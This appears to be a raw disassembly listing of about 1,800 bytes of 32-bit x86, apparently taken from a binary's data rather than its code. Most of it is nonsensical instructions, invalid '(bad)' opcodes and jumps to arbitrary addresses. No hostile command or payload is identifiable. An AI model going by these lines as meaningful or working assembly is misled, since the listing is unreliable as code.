  47b0c5:	xor    BYTE PTR [esp+ebp*2+0x1739f0b],dh
  47b0cc:	xchg   ecx,eax
  47b0cd:	cs dec eax
  47b0cf:	dec    esp
  47b0d0:	mov    ebx,0x7b48837
  47b0d5:	push   eax
  47b0d6:	outs   dx,BYTE PTR gs:[esi]
  47b0d8:	int    0x6
  47b0da:	fistp  WORD PTR [esi]
  47b0dc:	(bad)  
  47b0de:	inc    esp
  47b0df:	cs pop es
  47b0e1:	jo     0x47b077
  47b0e3:	outs   dx,DWORD PTR ds:[esi]
  47b0e4:	sbb    al,0x6
  47b0e6:	push   cs
  47b0e7:	inc    esp
  47b0e8:	popa   
  47b0e9:	jae    0x47b153
  47b0eb:	add    eax,0x7ecbc86e
  47b0f0:	or     al,0x6f
  47b0f2:	je     0x47b0fd
  47b0f4:	sbb    DWORD PTR [edx],edx
  47b0f6:	or     al,0x4
  47b0f8:	popa   
  47b0f9:	outs   dx,BYTE PTR ds:[esi]
  47b0fa:	add    eax,0x7c4356f6
  47b0ff:	mov    BYTE PTR ds:0x736e4966,cl
  47b105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47b106:	pusha  
  47b107:	mov    al,ds:0xf7c4f2b4
  47b10c:	mov    al,0xc3
  47b10e:	and    BYTE PTR [edx-0x17],al
  47b111:	iret   
  47b112:	or     ch,al
  47b114:	(bad)  
  47b116:	popa   
  47b117:	jge    0x47b192
  47b119:	int3   
  47b11a:	lods   al,BYTE PTR ds:[esi]
  47b11b:	ins    DWORD PTR es:[edi],dx
  47b11c:	inc    edx
  47b11d:	ins    BYTE PTR es:[edi],dx
  47b11e:	dec    esi
  47b11f:	sar    DWORD PTR [esi+0x37],cl
  47b122:	dec    DWORD PTR [esi]
  47b124:	push   edi
  47b125:	push   0x5657469
  47b12a:	dec    esi
  47b12b:	outs   dx,DWORD PTR ds:[esi]
  47b12c:	jo     0x47b139
  47b12e:	je     0x47b136
  47b130:	push   ss
  47b131:	inc    ebx
  47b132:	pop    ebx
  47b133:	shl    BYTE PTR [edi+ebp*2+0x79],1
  47b137:	or     DWORD PTR [ecx],ebx
  47b139:	adc    ecx,DWORD PTR ds:0x6567d04d
  47b13f:	nop
  47b140:	popa   
  47b141:	pop    ecx
  47b142:	sar    DWORD PTR [ebp+0x41a0c22],0x6b
  47b149:	sbb    DWORD PTR ds:0x776d9b77,esi
  47b14f:	adc    al,0x20
  47b151:	xor    eax,0xa350719
  47b156:	(bad)  
  47b157:	jno    0x47b187
  47b159:	retf   
  47b15a:	mov    esi,0xb33f0615
  47b15f:	adc    esp,eax
  47b161:	xor    eax,0xe2b62bdc
  47b166:	or     BYTE PTR [edi],bl
  47b168:	adc    BYTE PTR [edi+0xd],dh
  47b16b:	sbb    BYTE PTR [ebx+0x3b56ce6],0x42
  47b172:	jb     0x47b1e9
  47b174:	fimul  DWORD PTR [ebx+0x70]
  47b177:	xchg   ecx,eax
  47b178:	out    0x33,eax
  47b17a:	pop    es
  47b17b:	push   0x2a0e62b5
  47b180:	push   cs
  47b181:	pop    ebx
  47b182:	sti    
  47b183:	add    ecx,DWORD PTR [esi+ecx*1]
  47b186:	dec    eax
  47b187:	jl     0x47b1f2
  47b189:	jp     0x47b15d
  47b18b:	or     bl,BYTE PTR ss:[ebx-0x45]
  47b18f:	test   ch,dl
  47b191:	sbb    BYTE PTR [esi-0x1e],dl
  47b194:	arpl   WORD PTR [ebx+ecx*1],dx
  47b197:	cs inc esi
  47b199:	inc    esp
  47b19a:	out    dx,eax
  47b19b:	cmp    BYTE PTR [esi+eiz*8+0x69],0x61
  47b1a0:	addr16 pop ss
  47b1a2:	inc    edx
  47b1a3:	outs   dx,DWORD PTR ds:[esi]
  47b1a4:	jb     0x47b215
  47b1a6:	jae    0x47b21b
  47b1a8:	call   0x26beede1
  47b1ad:	and    eax,0xb6306f17
  47b1b2:	icebp  
  47b1b3:	fidiv  WORD PTR [ebp+0x1f58bf89]
  47b1b9:	cmp    al,0x16
  47b1bb:	inc    esp
  47b1bc:	push   es
  47b1bd:	sbb    BYTE PTR [ecx],dl
  47b1bf:	cmp    DWORD PTR [eax],0xcb7fc700
  47b1c5:	ret    0x20b
  47b1c8:	test   ch,bh
  47b1ca:	jmp    DWORD PTR [eax+ecx*8-0x12]
  47b1ce:	inc    edx
  47b1cf:	inc    esp
  47b1d0:	fdivr  DWORD PTR [esi-0x2b]
  47b1d3:	aas    
  47b1d4:	mov    edi,0xb420c16d
  47b1d9:	pop    es
  47b1da:	sub    DWORD PTR [ecx],ecx
  47b1dc:	xchg   edi,eax
  47b1dd:	adc    al,0x46
  47b1df:	lock in eax,0x31
  47b1e2:	push   es
  47b1e3:	test   BYTE PTR [eax],al
  47b1e5:	nop
  47b1e6:	add    DWORD PTR [ebp-0x177fd04a],0x60
  47b1ed:	loope  0x47b1fe
  47b1ef:	sub    ebp,DWORD PTR [ecx-0x4f]
  47b1f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47b1f3:	stc    
  47b1f4:	push   ebx
  47b1f5:	outs   dx,DWORD PTR ds:[esi]
  47b1f6:	and    DWORD PTR [ebx],esp
  47b1f8:	mov    dh,0x1f
  47b1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47b1fb:	inc    esp
  47b1fc:	xchg   ebx,eax
  47b1fd:	ins    DWORD PTR es:[edi],dx
  47b1fe:	push   ebx
  47b1ff:	lock mov bl,0xa0
  47b202:	adc    dl,BYTE PTR [eax+0x1087b704]
  47b208:	shl    ebx,0x5c
  47b20b:	jnp    0x47b223
  47b20d:	xor    al,0x1f
  47b20f:	and    ch,BYTE PTR [edx]
  47b211:	and    al,0xa6
  47b213:	cmp    cl,cl
  47b215:	mov    esp,esp
  47b217:	in     al,0xb5
  47b219:	je     0x47b1e6
  47b21b:	mov    eax,0x75e961cb
  47b220:	push   ebx
  47b221:	xchg   edi,eax
  47b222:	xor    BYTE PTR [esi-0xf942e23],0x4b
  47b229:	retf   
  47b22a:	pushf  
  47b22b:	xor    al,BYTE PTR ds:0x2907cff1
  47b231:	xor    BYTE PTR [eax+0x66],bh
  47b234:	adc    eax,0xa3d55404
  47b239:	sub    DWORD PTR [ebx+esi*4-0x4c3feb93],edi
  47b240:	neg    BYTE PTR [eax+edx*8]
  47b243:	push   es
  47b244:	add    DWORD PTR [edi],ecx
  47b246:	scas   eax,DWORD PTR es:[edi]
  47b247:	sbb    ch,BYTE PTR [eax-0x6fc0f831]
  47b24d:	mov    dl,0xdb
  47b24f:	cmp    BYTE PTR [eax+0x4b],al
  47b252:	in     al,dx
  47b253:	push   esp
  47b255:	int3   
  47b256:	inc    ebx
  47b257:	push   ss
  47b258:	add    eax,0x7edb12eb
  47b25d:	push   ebx
  47b25e:	adc    al,0xd4
  47b260:	into   
  47b261:	ss fmul st(6),st
  47b264:	aas    
  47b265:	fist   WORD PTR [ebp+0x650bb88]
  47b26b:	dec    eax
  47b26c:	xor    BYTE PTR gs:[eax+0x6fcf04c4],0xa
  47b274:	adc    edi,DWORD PTR [ebx-0x34]
  47b277:	iret   
  47b278:	inc    ecx
  47b279:	add    edx,DWORD PTR [ebp-0x2186f69a]
  47b27f:	ins    BYTE PTR es:[edi],dx
  47b280:	cmp    al,0xec
  47b282:	hlt    
  47b283:	cmp    BYTE PTR [esi+0x5f75e792],bh
  47b289:	jmp    0x47b24a
  47b28b:	js     0x47b309
  47b28d:	xchg   esp,eax
  47b28e:	add    BYTE PTR [ebp+0x23],ch
  47b291:	lods   al,BYTE PTR ds:[esi]
  47b292:	out    0x5,al
  47b294:	push   ebx
  47b295:	js     0x47b2c3
  47b297:	mov    ah,0xba
  47b299:	mov    ah,0x1e
  47b29b:	fld    DWORD PTR [ebp+0x7c06c03c]
  47b2a1:	outs   dx,DWORD PTR ds:[esi]
  47b2a2:	lea    edx,[edi]
  47b2a4:	fwait
  47b2a5:	cmp    BYTE PTR [esi],bl
  47b2a7:	jle    0x47b261
  47b2a9:	lahf   
  47b2aa:	cwde   
  47b2ab:	pop    ds
  47b2ac:	mov    WORD PTR [ebx+0x5e],cs
  47b2af:	xor    eax,0x90f71c3c
  47b2b4:	shl    bh,1
  47b2b6:	mov    edx,0x4167ab3
  47b2bb:	mov    ch,0xbe
  47b2bd:	lahf   
  47b2be:	pop    es
  47b2bf:	sbb    edx,edx
  47b2c1:	cmp    ebx,DWORD PTR [eax-0x6e]
  47b2c4:	pextrw eax,(bad),0xc5
  47b2c6:	add    al,0x14
  47b2c8:	sbb    eax,0x7935ed1
  47b2ce:	repnz inc ecx
  47b2d0:	add    al,ah
  47b2d2:	rol    DWORD PTR [eax],1
  47b2d4:	add    BYTE PTR [esi],bl
  47b2d6:	cmc    
  47b2d7:	bound  edx,QWORD PTR [edx-0x2d5f3ee1]
  47b2dd:	add    al,0x91
  47b2df:	add    al,0xc0
  47b2e1:	fidiv  DWORD PTR [ebx]
  47b2e3:	call   0x3508f757
  47b2e8:	mov    esp,0x243af23d
  47b2ed:	mov    eax,0xe43fc111
  47b2f2:	ds in  al,dx
  47b2f4:	add    ah,BYTE PTR [edx-0xd]
  47b2f7:	pop    esp
  47b2f8:	add    DWORD PTR [ebx],eax
  47b2fa:	push   edi
  47b2fb:	imul   eax,DWORD PTR [edx+eax*2],0x6645822e
  47b302:	cmp    BYTE PTR [ecx-0x50db4601],0x92
  47b309:	out    0xb9,al
  47b30b:	sbb    BYTE PTR [eax-0x2d],bl
  47b30e:	fstp   TBYTE PTR [edx+0x1680deb9]
  47b314:	push   es
  47b315:	cmp    eax,0x19079f90
  47b31a:	(bad)  
  47b31b:	repz xor cl,cl
  47b31e:	xchg   DWORD PTR [ebx],eax
  47b320:	add    al,BYTE PTR [edx]
  47b322:	mov    eax,0x9e435ed4
  47b327:	fs rcl ah,0xff
  47b32b:	(bad)  
  47b32c:	jmp    DWORD PTR [ebp-0x3a9bf0dc]
  47b332:	aam    0xd5
  47b334:	xchg   ah,bl
  47b336:	aad    0x0
  47b338:	add    edi,ecx
  47b33a:	lds    esp,FWORD PTR [esi]
  47b33c:	in     al,0x44
  47b33e:	mov    edx,0x585c1f68
  47b343:	popf   
  47b344:	nop
  47b345:	push   edi
  47b346:	pop    ebp
  47b347:	daa    
  47b348:	aam    0xd6
  47b34a:	in     al,0xdc
  47b34c:	imul   eax,edx,0xffffff9f
  47b34f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47b350:	push   es
  47b351:	rol    BYTE PTR [edi+eax*1],1
  47b354:	push   esp
  47b355:	inc    ebx
  47b356:	popa   
  47b357:	sbb    BYTE PTR [ebx-0x49],dh
  47b35a:	push   ecx
  47b35b:	mov    esp,0x1907ac2e
  47b360:	lock push cs
  47b362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47b363:	shl    ah,1
  47b365:	test   eax,0x64b99478
  47b36a:	adc    al,0xc4
  47b36c:	fisubr DWORD PTR [ebx-0x1a]
  47b36f:	scas   al,BYTE PTR es:[edi]
  47b370:	(bad)
  47b373:	or     esp,DWORD PTR [edi]
  47b375:	and    BYTE PTR [esi],bh
  47b377:	pop    es
  47b378:	aas    
  47b379:	push   ss
  47b37a:	or     edi,DWORD PTR [esi+edx*1+0x856cc16]
  47b381:	mov    al,ds:0x790bb2ad
  47b386:	fidiv  DWORD PTR [eax]
  47b388:	mov    bh,0x84
  47b38a:	or     al,0xa8
  47b38c:	add    dl,dl
  47b38e:	mov    eax,ds:0x59b6d3e9
  47b393:	xchg   esp,eax
  47b394:	mov    eax,0xdab8103c
  47b399:	imul   esp,DWORD PTR [eax+0x47],0xce038f0b
  47b3a0:	iret   
  47b3a1:	fcom   QWORD PTR [eax-0x6a]
  47b3a4:	popa   
  47b3a5:	dec    DWORD PTR [esp+edx*8]
  47b3a8:	push   esp
  47b3a9:	xchg   DWORD PTR [esp],eax
  47b3ac:	ret    
  47b3ad:	sbb    DWORD PTR [eax+0x32],ebx
  47b3b0:	and    ch,cl
  47b3b2:	and    dl,al
  47b3b4:	(bad)  
  47b3b6:	cmp    al,0xaf
  47b3b8:	mov    ebp,0xbb23dc0c
  47b3bd:	stos   BYTE PTR es:[edi],al
  47b3be:	xor    DWORD PTR [esi],eax
  47b3c0:	cmp    ecx,DWORD PTR [ecx]
  47b3c2:	sub    al,0xea
  47b3c4:	aas    
  47b3c5:	sti    
  47b3c6:	push   ss
  47b3c7:	mov    ebx,0xcd12a3cb
  47b3cc:	mov    eax,0x11d4267a
  47b3d1:	sbb    BYTE PTR ds:0xc0a65fbc,ch
  47b3d7:	dec    edi
  47b3d8:	pusha  
  47b3d9:	mov    dl,0xdd
  47b3db:	inc    esi
  47b3dc:	cs and al,0x67
  47b3df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47b3e0:	sbb    eax,0x1ac86f76
  47b3e5:	pop    edx
  47b3e6:	push   es
  47b3e7:	add    DWORD PTR [esp+edi*4+0x17],eax
  47b3eb:	sub    al,0xb2
  47b3ed:	sbb    esp,eax
  47b3ef:	jnp    0x47b425
  47b3f1:	push   es
  47b3f2:	sub    dh,cl
  47b3f4:	adc    al,0x20
  47b3f6:	or     ecx,DWORD PTR [edi]
  47b3f8:	jns    0x47b3fa
  47b3fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47b3fb:	icebp  
  47b3fc:	xor    al,0xf1
  47b3fe:	ins    DWORD PTR es:[edi],dx
  47b3ff:	jbe    0x47b3dc
  47b401:	addr16 push eax
  47b404:	movhps QWORD PTR [eax],xmm7
  47b407:	repz cmp al,0xf3
  47b40a:	xor    edi,DWORD PTR [ebx]
  47b40c:	js     0x47b3a9
  47b40e:	pop    ds
  47b40f:	mov    esp,0x22f4200f
  47b414:	hlt    
  47b415:	pop    ss
  47b416:	xor    al,0x58
  47b418:	fcmovnu st,st(6)
  47b41a:	loop   0x47b418
  47b41c:	lock xchg esi,eax
  47b41e:	ss enter 0x73f,0xc7
  47b423:	or     bh,BYTE PTR [esi+ecx*1+0x82e9413]
  47b42a:	mov    ch,0x8f
  47b42c:	add    ecx,eax
  47b42e:	fadd   DWORD PTR [ecx-0x5ddef8ba]
  47b434:	add    ah,al
  47b436:	adc    edx,DWORD PTR [edx-0x38]
  47b439:	and    BYTE PTR [eax+0x5588bcb0],dl
  47b43f:	repnz mov al,ds:0x3bcb467
  47b445:	jbe    0x47b44d
  47b447:	icebp  
  47b448:	mov    edi,0x94535437
  47b44d:	dec    ebp
  47b44e:	mov    ah,0x8d
  47b450:	jle    0x47b4b7
  47b452:	fs dec ecx
  47b454:	ins    DWORD PTR es:[edi],dx
  47b455:	popa   
  47b456:	addr16 xchg edi,eax
  47b458:	adc    BYTE PTR [ebp+0x40ee14bf],bh
  47b45e:	cmp    ebp,edi
  47b460:	ds je  0x47b431
  47b463:	fs mov edi,0xb03ef81c
  47b469:	mov    dh,0x10
  47b46b:	icebp  
  47b46c:	push   es
  47b46d:	or     al,0xee
  47b46f:	mov    dh,0x70
  47b471:	mov    edi,0xc85da4b9
  47b476:	jo     0x47b464
  47b478:	pop    ds
  47b479:	loopne 0x47b46d
  47b47b:	inc    esp
  47b47c:	repnz loop 0x47b4bb
  47b47f:	dec    esi
  47b480:	jl     0x47b43d
  47b482:	or     BYTE PTR [ebx],al
  47b484:	inc    edx
  47b485:	adc    ecx,DWORD PTR [eax+0x3441f2e]
  47b48b:	inc    edx
  47b48c:	and    al,al
  47b48e:	out    dx,al
  47b48f:	push   es
  47b490:	mov    edx,ebx
  47b492:	ss fcomip st,st(0)
  47b495:	es push esp
  47b497:	or     BYTE PTR [eax],cl
  47b499:	or     DWORD PTR [esi],eax
  47b49b:	dec    eax
  47b49c:	dec    edi
  47b49d:	pop    edi
  47b49e:	fsubr  QWORD PTR [edi+ebx*2-0x5c]
  47b4a2:	push   cs
  47b4a3:	nop
  47b4a4:	or     eax,0x60158c06
  47b4a9:	push   ss
  47b4aa:	inc    edx
  47b4ab:	dec    edi
  47b4ac:	xor    al,0x17
  47b4ae:	jns    0x47b43f
  47b4b0:	loop   0x47b529
  47b4b2:	outs   dx,BYTE PTR ds:[esi]
  47b4b3:	push   es
  47b4b4:	mov    al,ds:0x6c4f4202
  47b4b9:	or     al,0x66
  47b4bb:	sbb    cl,ch
  47b4bd:	neg    DWORD PTR [esi+0xe0be8b6]
  47b4c3:	push   eax
  47b4c4:	mov    eax,0x5476188e
  47b4c9:	adc    al,0x7
  47b4cb:	addr16 pop eax
  47b4cd:	add    DWORD PTR ds:0x19076797,0x70
  47b4d4:	shl    DWORD PTR [eax-0x58],1
  47b4d7:	ret    0xbc40
  47b4da:	pop    ss
  47b4db:	pop    eax
  47b4dc:	mov    esi,0xa4ab838f
  47b4e1:	cmp    DWORD PTR [esi+edi*4+0x18],ebx
  47b4e5:	lock push es
  47b4e7:	test   BYTE PTR [ebx+0x1b20cde9],0xa
  47b4ee:	push   esp
  47b4ef:	dec    ecx
  47b4f0:	arpl   sp,si
  47b4f2:	mov    edx,DWORD PTR [eax+0x6786b7b4]
  47b4f8:	bound  ebp,QWORD PTR [edi]
  47b4fa:	and    al,0xbf
  47b4fc:	pop    ds
  47b4fd:	sbb    BYTE PTR [edi+eax*4],dh
  47b500:	inc    esp
  47b501:	aaa    
  47b502:	leave  
  47b503:	stos   DWORD PTR es:[edi],eax
  47b504:	mov    WORD PTR [ebx],ds
  47b506:	mov    esp,0xdd10d716
  47b50b:	mov    ebx,0x421c1c3c
  47b510:	pop    esp
  47b511:	push   cs
  47b512:	mov    BYTE PTR [esi],al
  47b514:	xlat   BYTE PTR ds:[ebx]
  47b515:	mov    esp,0x9cf2f977
  47b51a:	sbb    al,0x42
  47b51c:	and    BYTE PTR [edi],bl
  47b51e:	inc    edx
  47b51f:	cmp    BYTE PTR [esi],cl
  47b521:	cmp    al,0x16
  47b523:	xor    al,0x7b
  47b525:	fisubr DWORD PTR [ecx-0x58]
  47b528:	sbb    eax,DWORD PTR [edi+0x542e1ddc]
  47b52e:	jl     0x47b536
  47b530:	or     eax,0x90cf070c
  47b535:	add    eax,0x74f2677
  47b53a:	push   esp
  47b53b:	push   0x18
  47b53d:	sbb    DWORD PTR fs:[ebx+ebp*2+0x7e6d43a8],eax
  47b545:	outs   dx,BYTE PTR ds:[esi]
  47b546:	cmp    eax,DWORD PTR ds:0xac06748c
  47b54c:	push   edi
  47b54d:	push   ds
  47b54e:	xor    al,0x5a
  47b550:	fsubr  DWORD PTR [esi-0x60]
  47b553:	mov    edi,0xc4bfa09f
  47b558:	add    BYTE PTR [edi],cl
  47b55a:	inc    eax
  47b55b:	add    al,0xc0
  47b55d:	data16 adc BYTE PTR [edi+0x4d371287],al
  47b564:	popa   
  47b565:	outs   dx,BYTE PTR ds:[esi]
  47b566:	nop
  47b567:	mov    eax,0x4e2bffe3
  47b56c:	mov    ecx,edx
  47b56e:	mov    edx,eax
  47b570:	xor    eax,eax
  47b572:	rol    ax,0x5
  47b576:	xor    cl,BYTE PTR [edx]
  47b578:	dec    ecx
  47b579:	jne    0x47b571
  47b57b:	and    esp,edi
  47b57d:	adc    BYTE PTR [ebx],0x3f
  47b580:	mov    WORD PTR [esi+0x20],cx
  47b584:	mov    al,ds:0xfda8421a
  47b589:	xlat   BYTE PTR ds:[ebx]
  47b58a:	shr    BYTE PTR [eax-0x50],0x70
  47b58e:	push   ebx
  47b58f:	push   esi
  47b590:	dec    ebx
  47b591:	data16 or cl,BYTE PTR [ebx+0x11f9f0a]
  47b598:	sub    eax,DWORD PTR [esi-0x50729850]
  47b59e:	xchg   esi,eax
  47b59f:	ss scas eax,DWORD PTR es:[edi]
  47b5a1:	mov    ch,0xf
  47b5a3:	mov    bh,0x50
  47b5a5:	nop
  47b5a6:	cmp    al,0xa4
  47b5a8:	aas    
  47b5a9:	popf   
  47b5aa:	scas   eax,DWORD PTR es:[edi]
  47b5ab:	mov    al,0x49
  47b5ad:	xchg   BYTE PTR [eax],dh
  47b5af:	stc    
  47b5b0:	in     al,dx
  47b5b1:	xchg   edx,eax
  47b5b2:	mov    al,0x24
  47b5b4:	adc    al,0xc1
  47b5b6:	add    DWORD PTR [eax+eax*1],edi
  47b5b9:	js     0x47b600
  47b5bb:	test   BYTE PTR [eax],cl
  47b5bd:	adc    al,0xf0
  47b5bf:	pop    esi
  47b5c0:	add    eax,0x1a2174cf
  47b5c5:	inc    di
  47b5c7:	add    bh,BYTE PTR [esi-0x168a437b]
  47b5cd:	(bad)
  47b5d1:	push   ebx
  47b5d2:	pop    ds
  47b5d3:	fsub   DWORD PTR gs:[eax+esi*2+0x1d18490]
  47b5db:	mov    esp,0x4507075f
  47b5e0:	cmp    eax,DWORD PTR [eax+0x20]
  47b5e3:	xor    DWORD PTR [eax-0x66],esp
  47b5e6:	add    ebp,esi
  47b5e8:	repz arpl WORD PTR [eax+0x1eca52],bp
  47b5ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47b5f0:	push   ds
  47b5f1:	mov    esi,0x68680813
  47b5f6:	addr16 dec edx
  47b5f8:	and    BYTE PTR [edx+ebp*1+0x500c4a54],dl
  47b5ff:	mov    bl,0x74
  47b601:	(bad)  
  47b602:	pop    edx
  47b603:	mov    esi,cs
  47b605:	iret   
  47b606:	add    al,BYTE PTR [edx-0x9594d1]
  47b60c:	or     BYTE PTR [ecx-0x62],cl
  47b60f:	sbb    al,0x6e
  47b611:	leave  
  47b612:	sbb    eax,ecx
  47b614:	mov    al,0x30
  47b616:	push   es
  47b617:	push   edx
  47b618:	sub    BYTE PTR [ecx],al
  47b61a:	push   edi
  47b61b:	jge    0x47b63d
  47b61d:	sbb    ah,0x91
  47b620:	mov    edi,0xf49382a2
  47b625:	and    al,0x17
  47b627:	add    al,ch
  47b629:	and    BYTE PTR [edi+ebp*1-0x134847],bh
  47b630:	dec    eax
  47b631:	(bad)  
  47b632:	in     al,dx
  47b633:	add    BYTE PTR [edx],ch
  47b635:	and    eax,0xf3d4e0ac
  47b63a:	(bad)  [eax+edx*8-0x6f]
  47b63e:	xor    esi,DWORD PTR [ebx+esi*8]
  47b641:	cmp    esi,DWORD PTR [ebp+0xd]
  47b644:	dec    esp
  47b645:	cld    
  47b646:	dec    esp
  47b647:	popa   
  47b648:	cmp    ebx,ebp
  47b64a:	sbb    al,0xd2
  47b64c:	pop    ecx
  47b64d:	inc    ebx
  47b64e:	mov    ebp,DWORD PTR [ecx+0x51]
  47b651:	cmp    eax,0x11c95bf3
  47b656:	jl     0x47b64c
  47b658:	mov    DWORD PTR [edx],eax
  47b65a:	inc    ebp
  47b65b:	mov    esi,0x217468ad
  47b660:	jmp    0xe59b97d
  47b665:	imul   eax,DWORD PTR [edi],0x37f703b0
  47b66b:	add    ecx,DWORD PTR [ecx]
  47b66d:	push   esi
  47b66e:	sub    al,0x45
  47b670:	pop    edi
  47b671:	pop    es
  47b672:	add    dl,BYTE PTR [ebx+0x6cc2d263]
  47b678:	push   ss
  47b679:	push   es
  47b67a:	jo     0x47b6f7
  47b67c:	loop   0x47b655
  47b67e:	cmp    edi,DWORD PTR [ebx+esi*8]
  47b681:	paddq  mm0,QWORD PTR [edx]
  47b684:	add    dl,BYTE PTR [eax-0x2f1f48c]
  47b68a:	add    al,0x27
  47b68c:	es es in eax,dx
  47b68f:	mov    cl,0x20
  47b691:	sub    DWORD PTR [edx+0x48],esi
  47b694:	sub    DWORD PTR [ecx+0x53],edi
  47b697:	ret    0x85a1
  47b69a:	sbb    al,0xed
  47b69c:	cmp    dh,BYTE PTR [edi]
  47b69e:	icebp  
  47b69f:	cmc    
  47b6a0:	mov    esi,0xbbdda2e4
  47b6a5:	xlat   BYTE PTR ds:[ebx]
  47b6a6:	sbb    al,0xff
  47b6a8:	inc    esi
  47b6a9:	add    al,0xec
  47b6ab:	jecxz  0x47b672
  47b6ad:	sbb    BYTE PTR ds:0xc7e1ad90,ah
  47b6b3:	and    al,0x1c
  47b6b5:	cwde   
  47b6b6:	mov    ecx,0x39df8d4e
  47b6bb:	ret    
  47b6bc:	jg     0x47b6f2
  47b6be:	xor    al,0x28
  47b6c0:	inc    ecx
  47b6c1:	std    
  47b6c2:	and    eax,0x8541f8b
  47b6c7:	push   cs
  47b6c8:	add    DWORD PTR [esi],ebp
  47b6ca:	push   es
  47b6cb:	adc    DWORD PTR [esp+edi*1],eax
  47b6ce:	jl     0x47b711
  47b6d0:	sub    BYTE PTR [ebp+0xb],bh
  47b6d3:	push   esi
  47b6d4:	jge    0x47b664
  47b6d6:	xchg   ecx,eax
  47b6d7:	add    BYTE PTR [ecx*2+0x11b1dbd7],ch
  47b6de:	repnz or cl,bl
  47b6e1:	inc    eax
  47b6e2:	ret    
  47b6e3:	test   ecx,0xad8515e4
  47b6e9:	in     al,0xb4
  47b6eb:	leave  
  47b6ec:	ret    0xba43
  47b6ef:	std    
  47b6f0:	in     eax,0xeb
  47b6f2:	push   ds
  47b6f3:	cli    
  47b6f4:	xchg   ebx,eax
  47b6f5:	mov    eax,ds:0x55f31fb5
  47b6fa:	leave  
  47b6fb:	adc    bh,bh
  47b6fd:	loopne 0x47b743
  47b6ff:	pushf  
  47b700:	add    DWORD PTR [ebx-0x27405b35],esi
  47b706:	addr16 jg 0x47b709
  47b709:	ins    BYTE PTR es:[edi],dx
  47b70a:	jg     0x47b6e3
  47b70c:	mov    eax,ds:0xc8b28bdc
  47b711:	mov    eax,ds:0xac0413e0
  47b716:	sbb    al,0x41
  47b718:	pop    ss
  47b719:	in     al,dx
  47b71a:	pop    ebp
  47b71b:	cld    
  47b71c:	add    al,BYTE PTR [ebx]
  47b71e:	(bad)  [edx-0x2]
  47b721:	push   ss
  47b722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47b723:	adc    ch,BYTE PTR [ebx]
  47b725:	add    cl,BYTE PTR [esi]
  47b727:	sahf   
  47b728:	retf   0x9ed
  47b72b:	out    0x6f,eax
  47b72d:	adc    BYTE PTR [eax],0x8a
  47b730:	shr    BYTE PTR [edi],1
  47b732:	(bad)  
  47b733:	arpl   WORD PTR [ebx+eax*2+0x21],bp
  47b737:	ret    
  47b738:	dec    ecx
  47b739:	addr16 lahf 
  47b73b:	arpl   WORD PTR [ebx],bx
  47b73d:	call   0x7261:0x4d6cfe76
  47b744:	outs   dx,DWORD PTR ds:[esi]
  47b745:	outs   dx,DWORD PTR ds:[esi]
  47b746:	outs   dx,BYTE PTR ds:[esi]
  47b747:	inc    edi
  47b748:	inc    edi
  47b749:	(bad)  
  47b74b:	scas   eax,DWORD PTR es:[edi]
  47b74c:	push   ebp
  47b74d:	and    al,0x6e
  47b74f:	pop    ds
  47b750:	dec    edi
  47b751:	ins    BYTE PTR es:[edi],dx
  47b752:	imul   esi,DWORD PTR [esi+0x65],0xdb4e8706
  47b759:	in     al,0x5f
  47b75b:	repnz popa 
  47b75d:	jbe    0x47b7d8
  47b75f:	add    BYTE PTR [eax+0x75],dl
  47b762:	jb     0x47b7d4
  47b764:	ins    BYTE PTR es:[edi],dx
  47b765:	gs inc edi
  47b767:	pusha  
  47b768:	push   es
  47b769:	add    al,0xf6
  47b76b:	push   esp
  47b76c:	gs popa 
  47b76e:	ins    BYTE PTR es:[edi],dx
  47b76f:	pop    ds
  47b770:	jle    0x47b7d9
  47b772:	add    bl,cl
  47b774:	and    bh,bh
  47b776:	push   ebx
  47b777:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0xb03f0572
  47b77f:	pop    ds
  47b780:	lods   al,BYTE PTR ds:[esi]
  47b781:	out    dx,al
  47b782:	xchg   DWORD PTR fs:[ecx+ebp*2+0x6d],ecx
  47b787:	gs iret 
  47b789:	pop    ecx
  47b78a:	gs ins BYTE PTR es:[edi],dx
  47b78c:	ins    BYTE PTR es:[edi],dx
  47b78d:	outs   dx,DWORD PTR ds:[esi]
  47b78e:	retf   
  47b78f:	in     eax,dx
  47b790:	rcl    DWORD PTR [edx+0x47759f77],0x9
  47b797:	adc    ah,bh
  47b799:	inc    eax
  47b79a:	inc    BYTE PTR [esi+0x75]
  47b79d:	arpl   WORD PTR [eax+0x73],bp
  47b7a0:	imul   esp,DWORD PTR [ecx+0x41],0xbf617571
  47b7a7:	inc    esp
  47b7a8:	ds js  0x47b7d4
  47b7ab:	pop    edi
  47b7ac:	pop    es
  47b7ad:	or     al,0xb0
  47b7af:	or     DWORD PTR [edx],ebp
  47b7b1:	inc    ecx
  47b7b2:	xchg   BYTE PTR [ecx-0x17],bh
  47b7b5:	add    BYTE PTR [edi+0x3d96b126],dl
  47b7bb:	push   ebx
  47b7bc:	imul   edi,DWORD PTR [ecx-0x43],0x77
  47b7c0:	and    eax,0xec7b5c10
  47b7c5:	ins    DWORD PTR es:[edi],dx
  47b7c6:	inc    edi
  47b7c7:	dec    ebp
  47b7c8:	data16 mov ch,0x2c
  47b7cb:	add    eax,0xedff220
  47b7d0:	(bad)  
  47b7d1:	xchg   sp,ax
  47b7d3:	fwait
  47b7d4:	add    ah,dh
  47b7d6:	mov    eax,0xbd68bc2f
  47b7db:	cmovae esp,DWORD PTR fs:[ecx-0x59]
  47b7e0:	add    esp,DWORD PTR [esi+esi*8+0x70705fc0]
  47b7e7:	push   edi
  47b7e8:	pop    eax
  47b7e9:	imul   ecx,DWORD PTR [ebx],0xfffffff1
  47b7ec:	and    dh,BYTE PTR [edx]
  47b7ee:	xor    DWORD PTR [edi+0x7267540c],0x24b044fb
  47b7f8:	xchg   esp,eax
  47b7f9:	das    
  47b7fa:	inc    edx
  47b7fb:	je     0x47b86b
  47b7fd:	inc    esi
  47b7fe:	push   ebp
  47b7ff:	push   eax
  47b800:	xchg   esi,ebx
  47b802:	fiadd  DWORD PTR [edi+0x6c544826]
